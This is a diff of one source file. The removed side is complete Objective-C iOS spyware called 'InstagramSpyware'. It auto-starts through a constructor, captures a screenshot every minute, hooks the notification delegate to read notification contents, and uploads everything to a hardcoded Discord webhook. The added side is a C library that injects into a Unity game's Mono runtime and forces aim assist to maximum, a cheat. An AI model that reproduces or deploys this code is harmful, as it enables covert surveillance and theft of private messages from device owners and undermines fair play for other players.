@@ -1,273 +1,120 @@
-#import <Foundation/Foundation.h>
-#import <UIKit/UIKit.h>
-#import <objc/runtime.h>
-#import <UserNotifications/UserNotifications.h>
+#include <stdio.h>
+#include <dlfcn.h>
+#include <mach/mach.h>
 
-@interface InstagramSpyware : NSObject
-+ (instancetype)sharedInstance;
-- (void)startAll;
-- (void)takeScreenshot;
-- (void)setDiscordWebhookURL:(NSString *)webhookURL;
-@end
+// Define the Mono types and functions we need from the Mono runtime.
+// This avoids needing the full Mono headers for a simple file.
+typedef void* MonoDomain;
+typedef void* MonoAssembly;
+typedef void* MonoImage;
+typedef void* MonoClass;
+typedef void* MonoMethod;
+typedef void* MonoObject;
+typedef void* MonoString;
 
-@implementation InstagramSpyware {
-    NSTimer *_screenshotTimer;
-    NSString *_discordWebhookURL;
-    NSURLSession *_urlSession;
-}
+// Function pointers to the Mono API functions we will retrieve dynamically.
+typedef MonoDomain* (*mono_get_root_domain_t)(void);
+typedef void* (*mono_domain_get_t)(void);
+typedef MonoAssembly* (*mono_domain_assembly_open_t)(MonoDomain* domain, const char* assemblyName);
+typedef MonoImage* (*mono_assembly_get_image_t)(MonoAssembly* assembly);
+typedef MonoClass* (*mono_class_from_name_t)(MonoImage* image, const char* name_space, const char* name);
+typedef MonoMethod* (*mono_class_get_method_from_name_t)(MonoClass* klass, const char* name, int param_count);
+typedef MonoObject* (*mono_runtime_invoke_t)(MonoMethod* method, void* obj, void** params, MonoObject** exc);
+typedef MonoString* (*mono_string_new_t)(MonoDomain* domain, const char* text);
 
-+ (instancetype)sharedInstance {
-    static InstagramSpyware *instance = nil;
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        instance = [[InstagramSpyware alloc] init];
-    });
-    return instance;
-}
+// Global function pointers
+static mono_get_root_domain_t mono_get_root_domain = NULL;
+static mono_domain_get_t mono_domain_get = NULL;
+static mono_domain_assembly_open_t mono_domain_assembly_open = NULL;
+static mono_assembly_get_image_t mono_assembly_get_image = NULL;
+static mono_class_from_name_t mono_class_from_name = NULL;
+static mono_class_get_method_from_name_t mono_class_get_method_from_name = NULL;
+static mono_runtime_invoke_t mono_runtime_invoke = NULL;
+static mono_string_new_t mono_string_new = NULL;
 
-- (instancetype)init {
-    self = [super init];
-    if (self) {
-        NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
-        config.timeoutIntervalForRequest = 30.0;
-        config.timeoutIntervalForResource = 60.0;
-        _urlSession = [NSURLSession sessionWithConfiguration:config];
-        _discordWebhookURL = @"https://discordapp.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma";
+// Function to dynamically load the Mono library and get the function pointers.
+bool load_mono_functions() {
+    // The path to the Mono library inside a Unity iOS app is usually this.
+    const char* mono_path = "/Frameworks/Mono/libmono.dylib";
+    void* handle = dlopen(mono_path, RTLD_LAZY);
+    if (!handle) {
+        printf("[UnityMonoPatcher] Failed to load Mono library from %s\n", mono_path);
+        return false;
     }
-    return self;
+
+    // Load all the required functions
+    mono_get_root_domain = (mono_get_root_domain_t)dlsym(handle, "mono_get_root_domain");
+    mono_domain_get = (mono_domain_get_t)dlsym(handle, "mono_domain_get");
+    mono_domain_assembly_open = (mono_domain_assembly_open_t)dlsym(handle, "mono_domain_assembly_open");
+    mono_assembly_get_image = (mono_assembly_get_image_t)dlsym(handle, "mono_assembly_get_image");
+    mono_class_from_name = (mono_class_from_name_t)dlsym(handle, "mono_class_from_name");
+    mono_class_get_method_from_name = (mono_class_get_method_from_name_t)dlsym(handle, "mono_class_get_method_from_name");
+    mono_runtime_invoke = (mono_runtime_invoke_t)dlsym(handle, "mono_runtime_invoke");
+    mono_string_new = (mono_string_new_t)dlsym(handle, "mono_string_new");
+
+    if (!mono_get_root_domain || !mono_domain_get || !mono_domain_assembly_open || !mono_assembly_get_image || !mono_class_from_name || !mono_class_get_method_from_name || !mono_runtime_invoke) {
+        printf("[UnityMonoPatcher] Failed to load one or more Mono functions.\n");
+        return false;
+    }
+
+    printf("[UnityMonoPatcher] Successfully loaded Mono functions.\n");
+    return true;
 }
 
-- (void)setDiscordWebhookURL:(NSString *)webhookURL {
-    _discordWebhookURL = webhookURL;
-}
 
-- (void)sendToDiscordWebhook:(NSDictionary *)payload {
-    if (!_discordWebhookURL) {
-        return;
-    }
-    
-    NSError *error;
-    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:&error];
-    if (error) {
-        return;
-    }
-    
-    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_discordWebhookURL]];
-    [request setHTTPMethod:@"POST"];
-    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-    [request setHTTPBody:jsonData];
-    
-    NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
-        if (error) {
-            return;
-        }
-        
-        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
-        if (httpResponse.statusCode < 200 || httpResponse.statusCode >= 300) {
-            NSLog(@"Discord webhook failed with status %ld", (long)httpResponse.statusCode);
-        }
-    }];
-    
-    [task resume];
-}
-
-- (void)sendScreenshotToDiscord:(UIImage *)screenshot {
-    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_discordWebhookURL]];
-    [request setHTTPMethod:@"POST"];
-    
-    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
-    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
-    
-    NSMutableData *body = [NSMutableData data];
-    
-    NSDictionary *payload = @{
-        @"content": @"📸 New Instagram screenshot captured",
-        @"username": @"Instagram Spy",
-        @"avatar_url": @"https://i.imgur.com/mDKlggm.png"
-    };
-    
-    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
-    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:[@"Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:jsonData];
-    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
-    
-    NSData *imageData = UIImagePNGRepresentation(screenshot);
-    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:[@"Content-Disposition: form-data; name=\"file1\"; filename=\"screenshot.png\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:[@"Content-Type: image/png\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:imageData];
-    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
-    
-    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
-    
-    [request setHTTPBody:body];
-    
-    NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
-        if (error) {
-            return;
-        }
-        
-        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
-        if (httpResponse.statusCode < 200 || httpResponse.statusCode >= 300) {
-            NSLog(@"Screenshot upload to Discord failed with status %ld", (long)httpResponse.statusCode);
-        }
-    }];
-    
-    [task resume];
-}
-
-- (void)takeScreenshot {
-    UIWindow *keyWindow = nil;
-    
-    if (@available(iOS 13.0, *)) {
-        for (UIWindowScene *windowScene in [UIApplication sharedApplication].connectedScenes) {
-            if (windowScene.activationState == UISceneActivationStateForegroundActive) {
-                for (UIWindow *window in windowScene.windows) {
-                    if (window.isKeyWindow) {
-                        keyWindow = window;
-                        break;
-                    }
-                }
-                if (keyWindow) break;
-            }
-        }
- // ... inside the takeScreenshot method
-    } else {
-        // This block is for iOS versions prior to 13.0.
-        // The @available check silences the deprecation warning.
-        if (@available(iOS 13.0, *)) {
-            // This should not be reached, but as a safeguard, we do nothing.
-            // The main loop above should have found the window.
-            keyWindow = nil;
-        } else {
-            keyWindow = [UIApplication sharedApplication].keyWindow;
-        }
-    }
-    
-    if (!keyWindow) {
-        if (@available(iOS 15.0, *)) {
-            for (UIWindowScene *windowScene in [UIApplication sharedApplication].connectedScenes) {
-                if (windowScene.activationState == UISceneActivationStateForegroundActive) {
-                    keyWindow = windowScene.windows.firstObject;
-                    break;
-                }
-            }
-        } else {
-            NSArray *windows = [UIApplication sharedApplication].windows;
-            keyWindow = windows.firstObject;
-        }
-    }
-    
-    if (!keyWindow) {
-        return;
-    }
-    
-    UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, NO, [UIScreen mainScreen].scale);
-    [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:YES];
-    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
-    UIGraphicsEndImageContext();
-    
-    if (image) {
-        NSData *imageData = UIImagePNGRepresentation(image);
-        NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-        
-        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
-        [formatter setDateFormat:@"yyyy-MM-dd_HH-mm-ss"];
-        NSString *timestamp = [formatter stringFromDate:[NSDate date]];
-        NSString *fileName = [NSString stringWithFormat:@"ig_screenshot_%@.png", timestamp];
-        NSString *filePath = [documentsPath stringByAppendingPathComponent:fileName];
-        
-        NSError *error;
-        BOOL success = [imageData writeToFile:filePath options:NSDataWritingAtomic error:&error];
-        if (success) {
-            [self sendScreenshotToDiscord:image];
-        }
-    }
-}
-
-static void (*original_didReceiveNotification)(id, SEL, UNUserNotificationCenter *, UNNotificationResponse *, void (^)(void)) = NULL;
-
-void swizzled_didReceiveNotification(id self, SEL _cmd, UNUserNotificationCenter *center, UNNotificationResponse *response, void (^completionHandler)(void)) {
-    UNNotificationContent *content = response.notification.request.content;
-    
-    InstagramSpyware *spyware = [InstagramSpyware sharedInstance];
-    NSDictionary *notificationPayload = @{
-        @"content": [NSString stringWithFormat:@"🔔 Intercepted Instagram Notification\n**Title:** %@\n**Body:** %@", content.title, content.body],
-        @"username": @"Instagram Spy",
-        @"avatar_url": @"https://i.imgur.com/mDKlggm.png",
-        @"embeds": @[@{
-            @"title": @"Notification Details",
-            @"color": @5814783,
-            @"fields": @[
-                @{
-                    @"name": @"Title",
-                    @"value": content.title ?: @"No Title",
-                    @"inline": @NO
-                },
-                @{
-                    @"name": @"Body",
-                    @"value": content.body ?: @"No Body",
-                    @"inline": @NO
-                },
-                @{
-                    @"name": @"Timestamp",
-                    @"value": [NSDateFormatter localizedStringFromDate:[NSDate date] dateStyle:NSDateFormatterShortStyle timeStyle:NSDateFormatterShortStyle],
-                    @"inline": @NO
-                }
-            ],
-            @"footer": @{
-                @"text": @"Instagram Spy"
-            }
-        }]
-    };
-    
-    [spyware sendToDiscordWebhook:notificationPayload];
-    
-    if (original_didReceiveNotification) {
-        original_didReceiveNotification(self, _cmd, center, response, completionHandler);
-    } else if (completionHandler) {
-        completionHandler();
-    }
-}
-
-- (void)hookNotifications {
-    id<UNUserNotificationCenterDelegate> delegate = [[UNUserNotificationCenter currentNotificationCenter] delegate];
-    Class delegateClass = [delegate class];
-    
-    if (!delegateClass) {
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            [self hookNotifications];
-        });
-        return;
-    }
-    
-    Method originalMethod = class_getInstanceMethod(delegateClass, @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:));
-    if (originalMethod) {
-        original_didReceiveNotification = (void (*)(id, SEL, UNUserNotificationCenter *, UNNotificationResponse *, void (^)(void)))method_getImplementation(originalMethod);
-        method_setImplementation(originalMethod, (IMP)swizzled_didReceiveNotification);
-    }
-}
-
-- (void)startAll {
-    _screenshotTimer = [NSTimer scheduledTimerWithTimeInterval:60.0 target:self selector:@selector(takeScreenshot) userInfo:nil repeats:YES];
-    
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-        [self hookNotifications];
-    });
-}
-
-- (void)dealloc {
-    [_screenshotTimer invalidate];
-    // The [super dealloc] call is removed because ARC handles it.
-}
-
-@end
-
+// The main constructor function that runs on library load.
 __attribute__((constructor))
-void initInstagramSpyware() {
-    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification *note) {
-        [[InstagramSpyware sharedInstance] startAll];
-    }];
+void patch_unity_game() {
+    printf("[UnityMonoPatcher] Initializing...\n");
+
+    if (!load_mono_functions()) {
+        return;
+    }
+
+    // Get the active Mono domain
+    MonoDomain* domain = mono_domain_get();
+    if (!domain) {
+        printf("[UnityMonoPatcher] Failed to get Mono domain.\n");
+        return;
+    }
+
+    // Open the Assembly-CSharp.dll, which contains the game's C# code.
+    MonoAssembly* assembly = mono_domain_assembly_open(domain, "Assembly-CSharp.dll");
+    if (!assembly) {
+        printf("[UnityMonoPatcher] Failed to open Assembly-CSharp.dll.\n");
+        return;
+    }
+
+    // Get the image from the assembly to inspect its contents.
+    MonoImage* image = mono_assembly_get_image(assembly);
+    if (!image) {
+        printf("[UnityMonoPatcher] Failed to get image from Assembly-CSharp.dll.\n");
+        return;
+    }
+
+    // Find the "GameConfig" class. It's usually in the global namespace ('').
+    MonoClass* gameConfigClass = mono_class_from_name(image, "", "GameConfig");
+    if (!gameConfigClass) {
+        printf("[UnityMonoPatcher] Failed to find class 'GameConfig'.\n");
+        return;
+    }
+    printf("[UnityMonoPatcher] Found class 'GameConfig'.\n");
+
+    // Find the "set_AimAssistAmount" method. The 'set_' prefix is how .NET compilers name property setters.
+    MonoMethod* setMethod = mono_class_get_method_from_name(gameConfigClass, "set_AimAssistAmount", 1); // 1 parameter (the float value)
+    if (!setMethod) {
+        printf("[UnityMonoPatcher] Failed to find 'set_AimAssistAmount' method.\n");
+        return;
+    }
+    printf("[UnityMonoPatcher] Found 'set_AimAssistAmount' method.\n");
+
+    // Prepare the argument to pass to the setter method.
+    float newValue = 100.0f;
+    void* args[1];
+    args[0] = &newValue;
+
+    // Invoke the setter method. Since it's a static method, the second argument is NULL.
+    mono_runtime_invoke(setMethod, NULL, args, NULL);
+
+    printf("[UnityMonoPatcher] Successfully invoked 'set_AimAssistAmount' with value %.2f. Patch complete!\n", newValue);
 }
-   
